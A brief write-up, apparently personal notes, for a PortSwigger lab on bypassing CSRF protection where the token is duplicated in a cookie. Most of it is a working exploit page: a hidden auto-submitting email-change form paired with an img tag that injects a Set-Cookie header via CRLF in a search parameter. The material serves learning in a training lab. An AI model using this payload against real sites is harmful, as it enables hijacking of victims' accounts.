# [CSRF where token is duplicated in cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie)

> in this lab the goal is to exploit the cookie `csrf` and the input `csrf` connection, a request is accepted if the two `csrf` is the same, it is not checked if it is from a pool, or have some connection to the user, just have to be the same

```
<form method="POST" action="https://xxx.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="duck@quack" />
  <input type="hidden" name="csrf" value="anything" />
</form>
<img
  src="https://xxx.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=anything%3b%20SameSite=None"
  onerror="document.forms[0].submit()"
/>
```
